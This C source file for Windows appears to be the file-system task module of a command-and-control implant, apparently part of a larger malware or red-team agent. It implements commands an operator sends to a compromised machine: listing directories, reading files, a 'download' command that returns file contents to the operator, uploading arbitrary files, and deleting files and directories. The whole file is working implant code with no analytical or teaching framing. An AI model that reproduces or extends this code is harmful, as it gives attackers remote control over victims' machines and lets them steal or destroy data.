#include <windows.h>
#include <stdio.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/tasks.h"

BOOL task_ls(BYTE *data, DWORD size, PC2_RESULT result) {
    char path[MAX_PATH] = ".\\*";
    if (data && size > 0) {
        CopyMemory(path, data, min(size, MAX_PATH - 3));
        path[min(size, MAX_PATH - 3)] = '\0';
        // Append wildcard if path doesn't have one
        DWORD len = (DWORD)lstrlenA(path);
        if (len > 0 && path[len - 1] != '*') {
            if (path[len - 1] != '\\') lstrcatA(path, "\\");
            lstrcatA(path, "*");
        }
    }

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        lstrcpynA(result->error, "directory not found or access denied", sizeof(result->error));
        return FALSE;
    }

    POUTPUT_BUFFER out = output_new(INITIAL_BUF_SIZE);

    do {
        ULARGE_INTEGER fileSize;
        fileSize.LowPart = fd.nFileSizeLow;
        fileSize.HighPart = fd.nFileSizeHigh;

        SYSTEMTIME st;
        FileTimeToSystemTime(&fd.ftLastWriteTime, &st);

        char type = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 'd' : '-';
        char readonly = (fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY) ? 'r' : '-';
        char hidden = (fd.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) ? 'h' : '-';

        output_printf(out, "%c%c%c %10llu %04d-%02d-%02d %02d:%02d %s\r\n",
            type, readonly, hidden,
            fileSize.QuadPart,
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute,
            fd.cFileName);

    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);

    result->data = out->data;
    result->data_size = out->size;
    out->data = NULL;
    HeapFree(GetProcessHeap(), 0, out);
    return TRUE;
}

BOOL task_cd(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "no path specified", sizeof(result->error));
        return FALSE;
    }

    char path[MAX_PATH] = {0};
    CopyMemory(path, data, min(size, MAX_PATH - 1));

    if (!SetCurrentDirectoryA(path)) {
        lstrcpynA(result->error, "failed to change directory", sizeof(result->error));
        return FALSE;
    }

    return task_pwd(result);
}

BOOL task_pwd(PC2_RESULT result) {
    char cwd[MAX_PATH] = {0};
    DWORD len = GetCurrentDirectoryA(MAX_PATH, cwd);
    if (len == 0) {
        lstrcpynA(result->error, "GetCurrentDirectory failed", sizeof(result->error));
        return FALSE;
    }

    DWORD alloc_size = len + 2;
    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, alloc_size);
    if (!result->data) return FALSE;
    CopyMemory(result->data, cwd, len);
    result->data[len] = '\n';
    result->data_size = len + 1;
    return TRUE;
}

BOOL task_cat(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "no file specified", sizeof(result->error));
        return FALSE;
    }

    char path[MAX_PATH] = {0};
    CopyMemory(path, data, min(size, MAX_PATH - 1));

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        lstrcpynA(result->error, "file not found or access denied", sizeof(result->error));
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize > MAX_OUTPUT_SIZE) {
        CloseHandle(hFile);
        lstrcpynA(result->error, "file too large", sizeof(result->error));
        return FALSE;
    }

    result->data = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize + 1);
    if (!result->data) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    ReadFile(hFile, result->data, fileSize, &bytesRead, NULL);
    result->data_size = bytesRead;

    CloseHandle(hFile);
    return TRUE;
}

BOOL task_upload(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size < 4) {
        lstrcpynA(result->error, "invalid upload data", sizeof(result->error));
        return FALSE;
    }

    // Format: path_len (4 bytes) + path + file_data
    DWORD path_len = *(DWORD *)data;
    if (path_len >= MAX_PATH || (4 + path_len) > size) {
        lstrcpynA(result->error, "invalid path length", sizeof(result->error));
        return FALSE;
    }

    char path[MAX_PATH] = {0};
    CopyMemory(path, data + 4, path_len);

    BYTE *file_data = data + 4 + path_len;
    DWORD file_size = size - 4 - path_len;

    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        lstrcpynA(result->error, "cannot create file", sizeof(result->error));
        return FALSE;
    }

    DWORD written;
    WriteFile(hFile, file_data, file_size, &written, NULL);
    CloseHandle(hFile);

    POUTPUT_BUFFER out = output_new(256);
    output_printf(out, "uploaded %lu bytes to %s", written, path);
    result->data = out->data;
    result->data_size = out->size;
    out->data = NULL;
    HeapFree(GetProcessHeap(), 0, out);
    return TRUE;
}

BOOL task_download(BYTE *data, DWORD size, PC2_RESULT result) {
    // Download = read file and return content (same as cat for the binary protocol)
    return task_cat(data, size, result);
}

BOOL task_rm(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "no path specified", sizeof(result->error));
        return FALSE;
    }

    char path[MAX_PATH] = {0};
    CopyMemory(path, data, min(size, MAX_PATH - 1));

    DWORD attrs = GetFileAttributesA(path);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        lstrcpynA(result->error, "file not found", sizeof(result->error));
        return FALSE;
    }

    BOOL ok;
    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
        ok = RemoveDirectoryA(path);
    } else {
        ok = DeleteFileA(path);
    }

    if (!ok) {
        lstrcpynA(result->error, "delete failed", sizeof(result->error));
        return FALSE;
    }
    return TRUE;
}

BOOL task_mkdir_cmd(BYTE *data, DWORD size, PC2_RESULT result) {
    if (!data || size == 0) {
        lstrcpynA(result->error, "no path specified", sizeof(result->error));
        return FALSE;
    }

    char path[MAX_PATH] = {0};
    CopyMemory(path, data, min(size, MAX_PATH - 1));

    if (!CreateDirectoryA(path, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_ALREADY_EXISTS) {
            lstrcpynA(result->error, "mkdir failed", sizeof(result->error));
            return FALSE;
        }
    }
    return TRUE;
}
